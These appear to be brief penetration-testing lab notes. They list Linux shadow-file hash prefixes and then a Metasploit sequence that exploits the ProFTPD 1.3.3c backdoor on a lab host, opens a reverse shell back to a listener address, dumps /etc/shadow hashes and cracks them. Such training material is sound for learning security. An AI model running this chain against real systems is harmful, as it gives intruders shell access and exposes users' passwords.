- /etc/shadow => Password Hashes
- $1 => MD5
- $2 => Blowfish
- $5 => SHA-256
- $6 => SHA-512
----
[LAB]

```bash
First step is to get access to target machine using FTP vulnerable service.
> msfconsole -q
> use exploit/unix/ftp/proftpd_133c_backdoor
> set payload payload/cmd/unix/reverse
> set RHOSTS demo.ine.local
> set LHOST 192.70.114.2
>exploit -z


> use post/linux/gather/hashdump
> set SESSION 1
> exploit


> use auxiliary/analyze/crack_linux
> set SHA512 true
> run

Password Cracked
```